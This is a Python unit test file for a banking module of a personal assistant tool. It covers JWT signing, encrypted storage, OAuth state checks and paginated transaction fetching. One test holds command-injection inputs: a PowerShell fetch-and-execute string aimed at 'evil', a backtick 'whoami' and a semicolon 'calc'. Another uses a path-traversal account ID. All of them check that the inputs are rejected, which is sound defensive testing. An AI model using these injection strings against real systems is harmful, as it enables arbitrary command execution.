"""Enable Banking : JWT vérifiable, stockage chiffré, liaison protégée par `state`, lecture paginée et bornée (réseau simulé)."""
import base64
import json
import tempfile
import unittest
from datetime import date, datetime, timedelta, timezone
from pathlib import Path
from unittest import mock

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

from jarvis import __main__ as cli
from jarvis.core import banking
from jarvis.core.audit import Audit

KEY = rsa.generate_private_key(public_exponent=65537, key_size=2048)
PEM = KEY.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption())


def unb64(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


class BankBase(unittest.TestCase):
    def setUp(self):
        d = Path(tempfile.mkdtemp())
        self.vault = {}
        self.calls = []
        self.routes = {}
        for p in (mock.patch.object(banking, "STORE", d / "bank.enc"), mock.patch.object(banking, "CACHE", d / "bank-data.enc"),
                  mock.patch.object(banking, "get_secret", side_effect=self.vault.get),
                  mock.patch.object(banking, "set_secret", side_effect=self.vault.__setitem__),
                  mock.patch.object(banking, "_call", side_effect=self.fake_call)):
            p.start()
            self.addCleanup(p.stop)

    def fake_call(self, store, method, path, body=None, query=None):
        self.calls.append((method, path, body, query))
        r = self.routes[(method, path)]
        return r(query) if callable(r) else r

    def configured(self):
        banking.configure("app-1", PEM, "https://exemple.fr/retour")


class StoreTest(BankBase):
    def test_configuration_chiffree_et_cle_dans_le_coffre(self):
        self.configured()
        raw = banking.STORE.read_bytes()
        self.assertNotIn(b"PRIVATE KEY", raw)
        self.assertNotIn(b"app-1", raw)
        self.assertIn("bank_key", self.vault)
        self.assertEqual(json.loads(Fernet(self.vault["bank_key"]).decrypt(raw))["app_id"], "app-1")

    def test_entrees_invalides_refusees(self):
        for args in (("app 1", PEM, "https://x.fr"), ("app-1", b"pas une cle", "https://x.fr"), ("app-1", PEM, "http://x.fr")):
            with self.assertRaises(banking.BankError):
                banking.configure(*args)
        self.assertFalse(banking.STORE.exists())

    def test_cle_du_coffre_changee_erreur_claire(self):
        self.configured()
        self.vault["bank_key"] = Fernet.generate_key().decode()
        with self.assertRaisesRegex(banking.BankError, "illisible"):
            banking.status()

    def test_sans_configuration(self):
        with self.assertRaisesRegex(banking.BankError, "aucune"):
            banking.fetch()


class JwtTest(unittest.TestCase):
    def test_signature_rs256_verifiable(self):
        tok = banking.jwt("app-1", PEM.decode(), now=1000)
        head, body, sig = tok.split(".")
        KEY.public_key().verify(unb64(sig), f"{head}.{body}".encode(), padding.PKCS1v15(), hashes.SHA256())
        self.assertEqual(json.loads(unb64(head))["kid"], "app-1")
        claims = json.loads(unb64(body))
        self.assertEqual((claims["aud"], claims["exp"] - claims["iat"]), ("api.enablebanking.com", banking.JWT_TTL))
        self.assertLessEqual(banking.JWT_TTL, 86400)


class LinkTest(BankBase):
    def setUp(self):
        super().setUp()
        self.configured()
        self.routes = {("GET", "/aspsps"): {"aspsps": [{"name": "Trade Republic", "country": "FR", "maximum_consent_validity": 7776000},
                                                       {"name": "Crédit Mutuel", "country": "FR", "maximum_consent_validity": 15552000}]},
                       ("POST", "/auth"): {"url": "https://banque.example/auth"},
                       ("POST", "/sessions"): {"session_id": "sess-1", "access": {"valid_until": "2099-01-01T00:00:00+00:00"},
                                               "accounts": [{"uid": "u1", "name": "Compte", "currency": "EUR", "account_id": {"iban": "FR7612345"}}]}}

    def test_nominal(self):
        link = banking.start_link("crédit mutuel")
        auth = self.calls[-1][2]
        self.assertEqual(auth["aspsp"], {"name": "Crédit Mutuel", "country": "FR"})
        self.assertEqual(auth["state"], link["state"])
        self.assertNotIn("payment", json.dumps(auth))
        self.assertEqual(banking.finish_link(link, f"https://exemple.fr/retour?code=abc&state={link['state']}"), 1)
        self.assertEqual(self.calls[-1][2], {"code": "abc"})
        self.assertEqual([(s["bank"], s["accounts"]) for s in banking.status()], [("Crédit Mutuel", 1)])
        self.assertNotIn(b"sess-1", banking.STORE.read_bytes())

    def test_consentement_borne_a_90_jours(self):
        from datetime import datetime, timezone
        banking.start_link("Crédit Mutuel")
        until = datetime.fromisoformat(self.calls[-1][2]["access"]["valid_until"])
        self.assertLessEqual((until - datetime.now(timezone.utc)).days, 90)

    def test_state_different_refuse(self):
        link = banking.start_link("Trade Republic")
        with self.assertRaisesRegex(banking.BankError, "state"):
            banking.finish_link(link, "https://exemple.fr/retour?code=abc&state=autre")
        self.assertNotIn(("POST", "/sessions"), [c[:2] for c in self.calls])

    def test_refus_a_la_banque(self):
        link = banking.start_link("Trade Republic")
        with self.assertRaises(banking.BankError):
            banking.finish_link(link, f"https://exemple.fr/retour?error=access_denied&state={link['state']}")

    def test_banque_inconnue_propose_les_proches(self):
        with self.assertRaisesRegex(banking.BankError, "Trade Republic"):
            banking.start_link("Trade")

    def test_relier_remplace_la_session_de_la_meme_banque(self):
        for _ in range(2):
            link = banking.start_link("Trade Republic")
            banking.finish_link(link, f"https://x.fr/?code=c&state={link['state']}")
        self.assertEqual(len(banking.status()), 1)


class FetchTest(BankBase):
    def setUp(self):
        super().setUp()
        self.configured()
        store = banking._load(banking.STORE, None)
        store["sessions"] = [{"id": "s", "bank": "Crédit Mutuel", "country": "FR", "valid_until": None,
                              "accounts": [{"uid": "u1", "name": "Compte ••2345", "currency": "EUR"}]}]
        banking._save(banking.STORE, store)
        pages = {None: {"transactions": [{"transaction_amount": {"amount": "12.50"}, "credit_debit_indicator": "DBIT",
                                          "booking_date": "2026-10-01", "creditor": {"name": "Boulangerie"}}], "continuation_key": "k2"},
                 "k2": {"transactions": [{"transaction_amount": {"amount": "1000"}, "credit_debit_indicator": "CRDT",
                                          "booking_date": "2026-10-05", "remittance_information": ["SALAIRE"]},
                                         {"transaction_amount": {"amount": "x"}}]}}
        self.routes = {("GET", "/accounts/u1/balances"): {"balances": [{"balance_type": "ITAV", "balance_amount": {"amount": "5"}},
                                                                       {"balance_type": "CLBD", "balance_amount": {"amount": "1234.56"}}]},
                       ("GET", "/accounts/u1/transactions"): lambda q: pages[q.get("continuation_key")]}

    def test_nominal_pagine_signe_et_chiffre(self):
        r = banking.fetch(date(2026, 10, 9))
        self.assertEqual(r, {"accounts": 1, "transactions": 2, "errors": []})
        self.assertEqual(self.calls[1][3]["date_from"], "2026-07-11")
        data = banking._load(banking.CACHE, None)["accounts"][0]
        self.assertEqual(data["balance"], 1234.56)
        self.assertEqual([(t["amount"], t["label"]) for t in data["transactions"]], [(1000.0, "SALAIRE"), (-12.5, "Boulangerie")])
        self.assertNotIn(b"Boulangerie", banking.CACHE.read_bytes())

    def test_pagination_bornee(self):
        self.routes[("GET", "/accounts/u1/transactions")] = {"transactions": [], "continuation_key": "boucle"}
        banking.fetch()
        self.assertEqual(sum(c[1].endswith("transactions") for c in self.calls), banking.MAX_PAGES)

    def test_banque_en_echec_signalee_sans_ecraser_le_cache(self):
        banking.fetch()
        before = banking.CACHE.read_bytes()

        def expired(q):
            raise banking.BankError("accès refusé")
        self.routes[("GET", "/accounts/u1/transactions")] = expired
        r = banking.fetch()
        self.assertEqual((r["accounts"], r["errors"]), (0, ["Crédit Mutuel : accès refusé"]))
        self.assertEqual(banking.CACHE.read_bytes(), before)


class ViewTest(FetchTest):
    def test_vue_sans_identifiant_triee_et_bornee(self):
        self.assertIsNone(banking.view())
        banking.fetch()
        v = banking.view(limit=1)
        self.assertEqual(v["accounts"], [{"bank": "Crédit Mutuel", "name": "Compte ••2345", "currency": "EUR", "balance": 1234.56}])
        self.assertEqual([(t["label"], t["account"], t["currency"]) for t in v["transactions"]], [("SALAIRE", "Crédit Mutuel · Compte ••2345", "EUR")])
        self.assertEqual(v["consent"], [{"bank": "Crédit Mutuel", "days_left": None, "renew": 'python -m jarvis bank link "Crédit Mutuel"'}])
        self.assertNotIn("u1", json.dumps(v))

    def test_commande_de_renouvellement_filtree(self):
        self.assertEqual(banking.renew_cmd("Trade Republic", "DE"), 'python -m jarvis bank link "Trade Republic" DE')
        for bank, country in (('X$(iwr evil|iex)', "FR"), ("X`whoami`", "FR"), ('X" ; calc', "FR"), ("Banque", "fr;x")):
            self.assertIsNone(banking.renew_cmd(bank, country))

    def test_coffre_indisponible_vue_absente(self):
        import keyring.errors
        banking.fetch()
        with mock.patch.object(banking, "get_secret", side_effect=keyring.errors.KeyringError):
            self.assertIsNone(banking.view())


class RobustnessTest(LinkTest):
    def test_uid_hostile_ecarte_a_la_liaison(self):
        self.routes[("POST", "/sessions")]["accounts"] = [{"uid": "../aspsps?x="}, {"uid": "u-2"}]
        link = banking.start_link("Trade Republic")
        self.assertEqual(banking.finish_link(link, f"https://x.fr/?code=c&state={link['state']}"), 1)

    def test_configuration_disparue_entre_les_deux_etapes(self):
        link = banking.start_link("Trade Republic")
        banking.STORE.unlink()
        with self.assertRaisesRegex(banking.BankError, "disparue"):
            banking.finish_link(link, f"https://x.fr/?code=c&state={link['state']}")

    def test_elements_mal_formes_ignores(self):
        self.assertIsNone(banking._tx("pas un dict"))
        self.assertEqual(banking._tx({"transaction_amount": {"amount": "3"}, "credit_debit_indicator": "DBIT", "creditor": "x",
                                      "remittance_information": ["R"]})["label"], "R")
        self.assertIsNone(banking._tx({"transaction_amount": "3"}))


class CliTest(BankBase):
    def run_cli(self, argv, tty=True):
        audit = Audit(":memory:")
        with mock.patch("sys.stdin.isatty", return_value=tty), mock.patch("builtins.print"):
            code = cli.bank_cmd(argv, audit)
        return code, [(r[2], r[5]) for r in audit.last(5)]  # (outil, décision)

    def test_terminal_non_interactif_refuse_et_journalise(self):
        with mock.patch.object(banking, "start_link") as link, mock.patch.object(banking, "configure") as key:
            self.assertEqual(self.run_cli(["bank", "link", "X"], tty=False), (1, [("bank_link", "refusé")]))
            self.assertEqual(self.run_cli(["bank", "key", "a", "f.pem", "https://x.fr"], tty=False)[0], 1)
        link.assert_not_called()
        key.assert_not_called()

    def test_fetch_planifie_sans_stdin(self):  # tâche planifiée sous pythonw : sys.stdin vaut None
        with mock.patch.object(banking, "fetch", return_value={"accounts": 1, "transactions": 0, "errors": []}), \
                mock.patch.object(cli.sys, "stdin", None), mock.patch("builtins.print"):
            audit = Audit(":memory:")
            self.assertEqual(cli.bank_cmd(["bank", "fetch"], audit), 0)
        self.assertEqual(audit.last(1)[0][2], "bank_fetch")

    def test_fetch_journalise_succes_et_echec(self):
        with mock.patch.object(banking, "fetch", return_value={"accounts": 1, "transactions": 3, "errors": []}):
            self.assertEqual(self.run_cli(["bank", "fetch"]), (0, [("bank_fetch", "auto")]))
        with mock.patch.object(banking, "fetch", side_effect=banking.BankError("x")):
            self.assertEqual(self.run_cli(["bank", "fetch"])[0], 1)

    def test_fetch_daily_une_fois_par_jour(self):
        with mock.patch.object(banking, "fetch", return_value={"accounts": 1, "transactions": 0, "errors": []}) as f:
            with mock.patch.object(banking, "fetched_today", return_value=True):
                self.assertEqual(self.run_cli(["bank", "fetch", "daily"]), (0, []))
            f.assert_not_called()
            with mock.patch.object(banking, "fetched_today", return_value=False):
                self.assertEqual(self.run_cli(["bank", "fetch", "daily"]), (0, [("bank_fetch", "auto")]))
            f.assert_called_once()

    def test_fetched_today(self):
        now = datetime.now(timezone.utc).isoformat(timespec="seconds")
        old = (datetime.now(timezone.utc) - timedelta(days=2)).isoformat(timespec="seconds")
        for at, expected in ((now, True), (old, False), (None, False)):
            with mock.patch.object(banking, "_load", return_value={"fetched_at": at} if at else None):
                self.assertIs(banking.fetched_today(), expected)

    def test_sous_commande_inconnue(self):
        self.assertEqual(self.run_cli(["bank", "pay"]), (2, []))


class CallTest(unittest.TestCase):
    def test_erreur_http_sans_corps(self):
        import io
        import urllib.error
        err = urllib.error.HTTPError(banking.API, 403, "x", {}, io.BytesIO(b"secret-session-id"))
        with mock.patch.object(banking._opener, "open", side_effect=err), self.assertRaises(banking.BankError) as cm:
            banking._call({"app_id": "a", "pem": PEM.decode()}, "GET", "/x")
        self.assertNotIn("secret", str(cm.exception))


if __name__ == "__main__":
    unittest.main()
